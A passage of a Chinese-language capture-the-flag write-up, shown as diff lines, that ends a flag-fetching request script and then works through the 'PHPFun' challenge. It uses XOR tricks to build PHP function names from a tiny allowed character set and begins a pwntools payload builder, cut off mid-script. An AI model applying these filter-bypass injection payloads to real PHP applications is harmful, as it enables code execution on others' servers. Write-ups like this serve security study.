+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">prepare</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">flag_url</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;idek{.*}&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="misc">misc</h2>
+<h3 id="phpfun">PHPFu&hellip;n:</h3>
+<p>题目限制了只能有以下几个字符</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="p">([.</span><span class="o">^</span><span class="p">])</span><span class="err">&#39;</span><span class="p">,</span>
+</span></span></code></pre></div><p>基本思路就是用现有的字符造更多的字符，但是因为只要一报错就会 <code>die()</code> ，所以不能用包括 <code>[].''</code> 在内的很多方式，只能从现有的开始：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">206</span><span class="p">]:</span> <span class="n">mapping</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">combinations</span><span class="p">(</span><span class="s1">&#39;[(,.^)]&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="n">x</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">mapping</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>         <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="n">mapping</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">207</span><span class="p">]:</span> <span class="n">mapping</span>
+</span></span><span class="line"><span class="cl"><span class="n">Out</span><span class="p">[</span><span class="mi">207</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;w&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;u&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x05</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;r&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x06</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x04</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;v&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x02</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;p&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x07</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x03</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;^&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">)}</span>
+</span></span></code></pre></div><p>所以现在就有了 <code>([.^])',swurvqpt</code>然后看到有 <code>str</code> 就想看看有什么能用的字符串相关的函数 <a href="https://www.php.net/manual/zh/ref.strings.php" target="_blank" rel="noopener noreffer">link</a>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">209</span><span class="p">]:</span> <span class="n">str_funcs</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;addcslashes&#39;</span><span class="p">,</span><span class="s1">&#39;addslashes&#39;</span><span class="p">,</span><span class="s1">&#39;bin2hex&#39;</span><span class="p">,</span><span class="s1">&#39;chop&#39;</span><span class="p">,</span><span class="s1">&#39;chr&#39;</span><span class="p">,</span><span class="s1">&#39;chunk_split&#39;</span><span class="p">,</span><span class="s1">&#39;convert_uudecode&#39;</span><span class="p">,</span><span class="s1">&#39;convert_ne</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">code</span><span class="s1">&#39;,&#39;</span><span class="n">count_chars</span><span class="s1">&#39;,&#39;</span><span class="n">crc32</span><span class="s1">&#39;,&#39;</span><span class="n">crypt</span><span class="s1">&#39;,&#39;</span><span class="n">echo</span><span class="s1">&#39;,&#39;</span><span class="n">explode</span><span class="s1">&#39;,&#39;</span><span class="n">fprintf</span><span class="s1">&#39;,&#39;</span><span class="n">get_html_translation_table</span><span class="s1">&#39;,&#39;</span><span class="n">hebrev</span><span class="s1">&#39;,&#39;</span><span class="n">heni</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="s1">&#39;,&#39;</span><span class="n">html_entity_decode</span><span class="s1">&#39;,&#39;</span><span class="n">htmlentities</span><span class="s1">&#39;,&#39;</span><span class="n">htmlspecialchars_decode</span><span class="s1">&#39;,&#39;</span><span class="n">htmlspecialchars</span><span class="s1">&#39;,&#39;</span><span class="n">implode</span><span class="s1">&#39;,&#39;</span><span class="n">join</span><span class="s1">&#39;,&#39;</span><span class="n">lcfi</span><span class="s1">&#39;t</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="p">,</span><span class="s1">&#39;levenshtein&#39;</span><span class="p">,</span><span class="s1">&#39;localeconv&#39;</span><span class="p">,</span><span class="s1">&#39;ltrim&#39;</span><span class="p">,</span><span class="s1">&#39;md5_file&#39;</span><span class="p">,</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span><span class="s1">&#39;metaphone&#39;</span><span class="p">,</span><span class="s1">&#39;money_format&#39;</span><span class="p">,</span><span class="s1">&#39;nl_langinfo&#39;</span><span class="p">,</span><span class="s1">&#39;nl2br&#39;</span><span class="p">,</span><span class="s1">&#39;nure</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">_format</span><span class="s1">&#39;,&#39;</span><span class="nb">ord</span><span class="s1">&#39;,&#39;</span><span class="n">parse_str</span><span class="s1">&#39;,&#39;</span><span class="nb">print</span><span class="s1">&#39;,&#39;</span><span class="n">printf</span><span class="s1">&#39;,&#39;</span><span class="n">quoted_printable_decode</span><span class="s1">&#39;,&#39;</span><span class="n">quoted_printable_encode</span><span class="s1">&#39;,&#39;</span><span class="n">quote</span><span class="s1">&#39;,</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">rtrim</span><span class="s1">&#39;,&#39;</span><span class="n">setlocale</span><span class="s1">&#39;,&#39;</span><span class="n">sha1_file</span><span class="s1">&#39;,&#39;</span><span class="n">sha1</span><span class="s1">&#39;,&#39;</span><span class="n">similar_text</span><span class="s1">&#39;,&#39;</span><span class="n">soundex</span><span class="s1">&#39;,&#39;</span><span class="n">sprintf</span><span class="s1">&#39;,&#39;</span><span class="n">sscanf</span><span class="s1">&#39;,&#39;</span><span class="n">str_contains</span><span class="s1">&#39;,&#39;</span><span class="n">str_eniw</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">th</span><span class="s1">&#39;,&#39;</span><span class="n">str_getcsv</span><span class="s1">&#39;,&#39;</span><span class="n">str_ireplace</span><span class="s1">&#39;,&#39;</span><span class="n">str_pad</span><span class="s1">&#39;,&#39;</span><span class="n">str_repeat</span><span class="s1">&#39;,&#39;</span><span class="n">str_replace</span><span class="s1">&#39;,&#39;</span><span class="n">str_rot13</span><span class="s1">&#39;,&#39;</span><span class="n">str_shuffle</span><span class="s1">&#39;,&#39;</span><span class="n">str_s</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">tr_starts_with</span><span class="s1">&#39;,&#39;</span><span class="n">str_word_count</span><span class="s1">&#39;,&#39;</span><span class="n">strcasecmp</span><span class="s1">&#39;,&#39;</span><span class="n">strchr</span><span class="s1">&#39;,&#39;</span><span class="n">strcmp</span><span class="s1">&#39;,&#39;</span><span class="n">strcoll</span><span class="s1">&#39;,&#39;</span><span class="n">strcspn</span><span class="s1">&#39;,&#39;</span><span class="n">strip_tags</span><span class="s1">&#39;,&#39;</span><span class="n">striphs</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">es</span><span class="s1">&#39;,&#39;</span><span class="n">stripos</span><span class="s1">&#39;,&#39;</span><span class="n">stripslashes</span><span class="s1">&#39;,&#39;</span><span class="n">stristr</span><span class="s1">&#39;,&#39;</span><span class="n">strlen</span><span class="s1">&#39;,&#39;</span><span class="n">strnatcasecmp</span><span class="s1">&#39;,&#39;</span><span class="n">strnatcmp</span><span class="s1">&#39;,&#39;</span><span class="n">strncasecmp</span><span class="s1">&#39;,&#39;</span><span class="n">strncmp</span><span class="s1">&#39;,&#39;</span><span class="n">strpbrk</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="p">,</span><span class="s1">&#39;strpos&#39;</span><span class="p">,</span><span class="s1">&#39;strrchr&#39;</span><span class="p">,</span><span class="s1">&#39;strrev&#39;</span><span class="p">,</span><span class="s1">&#39;strripos&#39;</span><span class="p">,</span><span class="s1">&#39;strrpos&#39;</span><span class="p">,</span><span class="s1">&#39;strspn&#39;</span><span class="p">,</span><span class="s1">&#39;strstr&#39;</span><span class="p">,</span><span class="s1">&#39;strtok&#39;</span><span class="p">,</span><span class="s1">&#39;strtolower&#39;</span><span class="p">,</span><span class="s1">&#39;strtoupper&#39;</span><span class="p">,</span><span class="s1">&#39;strtr</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="s1">&#39;,&#39;</span><span class="n">substr_compare</span><span class="s1">&#39;,&#39;</span><span class="n">substr_count</span><span class="s1">&#39;,&#39;</span><span class="n">substr_replace</span><span class="s1">&#39;,&#39;</span><span class="n">substr</span><span class="s1">&#39;,&#39;</span><span class="n">trim</span><span class="s1">&#39;,&#39;</span><span class="n">ucfirst</span><span class="s1">&#39;,&#39;</span><span class="n">ucwords</span><span class="s1">&#39;,&#39;</span><span class="n">utf8_decode</span><span class="s1">&#39;,&#39;</span><span class="n">utne</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">code</span><span class="s1">&#39;,&#39;</span><span class="n">vfprintf</span><span class="s1">&#39;,&#39;</span><span class="n">vprintf</span><span class="s1">&#39;,&#39;</span><span class="n">vsprintf</span><span class="s1">&#39;,&#39;</span><span class="n">wordwrap</span><span class="s1">&#39;]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">210</span><span class="p">]:</span> <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="n">str_funcs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">mapping</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">func</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>         <span class="nb">print</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">strstr</span>
+</span></span><span class="line"><span class="cl"><span class="n">strtr</span>
+</span></span></code></pre></div><p>然后通过 <code>strstr</code> 就可以拿到 <code>false = strstr('.',',')</code> ，但是还不够，于是就跑去把所有的函数都拿来了 <a href="https://www.php.net/manual/zh/indexes.functions.php" target="_blank" rel="noopener noreffer">link</a>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">211</span><span class="p">]:</span> <span class="n">phpfuncs</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/phpfuncs.txt&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="n">phpfuncs</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">212</span><span class="p">]:</span> <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="n">phpfuncs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">mapping</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">func</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>         <span class="nb">print</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqrt</span>
+</span></span><span class="line"><span class="cl"><span class="n">strstr</span>
+</span></span><span class="line"><span class="cl"><span class="n">strtr</span>
+</span></span></code></pre></div><p>然后通过 <code>sqrt(strstr('.',','))</code> 拿到了 <code>0</code> ，但是拿到数字之后现在并没有什么用，于是想办法放到之前已经有的字符里面看看还能生成什么字符：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">In</span> <span class="p">[</span><span class="mi">215</span><span class="p">]:</span> <span class="n">mapping</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">combinations</span><span class="p">(</span><span class="s1">&#39;[(,.^)]0&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="n">x</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">mapping</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>         <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="n">mapping</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span> <span class="n">mapping</span>
+</span></span><span class="line"><span class="cl"><span class="n">Out</span><span class="p">[</span><span class="mi">215</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;w&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;u&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x05</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;r&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x06</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;k&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x04</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;v&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x02</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x1c</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;p&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x07</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x1e</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x03</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;^&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;n&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;^&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;</span><span class="se">\x19</span><span class="s1">&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;m&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl"> <span class="n">In</span> <span class="p">[</span><span class="mi">216</span><span class="p">]:</span> <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="n">phpfuncs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>     <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">mapping</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">func</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>         <span class="nb">print</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">...</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqrt</span>
+</span></span><span class="line"><span class="cl"><span class="n">strspn</span>
+</span></span><span class="line"><span class="cl"><span class="n">strstr</span>
+</span></span><span class="line"><span class="cl"><span class="n">strtr</span>
+</span></span></code></pre></div><p>多了一个 <code>strspn</code> 那么现在就有任意数字了，接下来就想办法构造 <code>chr</code> 函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;h&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;r&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p><code>chr</code> 出了就可以开始写 exp 了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span>      <span class="o">=</span> <span class="s2">&#34;(&#39;[&#39;^&#39;(&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">str</span>    <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2">.(&#39;)&#39;^&#39;]&#39;).(&#39;[&#39;^&#39;)&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">strstr</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">str</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="nb">str</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sqrt</span>   <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2">.(&#39;,&#39;^&#39;]&#39;).(&#39;[&#39;^&#39;)&#39;).(&#39;)&#39;^&#39;]&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">zero</span>   <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;(</span><span class="si">{</span><span class="n">sqrt</span><span class="si">}</span><span class="s2">)((</span><span class="si">{</span><span class="n">strstr</span><span class="si">}</span><span class="s2">)(&#39;.&#39;,&#39;,&#39;)).&#39;&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">strspn</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">str</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2">.(&#39;.&#39;^&#39;^&#39;).(&#39;^&#39;^</span><span class="si">{</span><span class="n">zero</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">num</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;(</span><span class="si">{</span><span class="n">strspn</span><span class="si">}</span><span class="s2">)(&#39;</span><span class="si">{</span><span class="s1">&#39;.&#39;</span> <span class="o">*</span> <span class="n">x</span><span class="si">}</span><span class="s2">&#39;,&#39;.&#39;)&#34;</span>
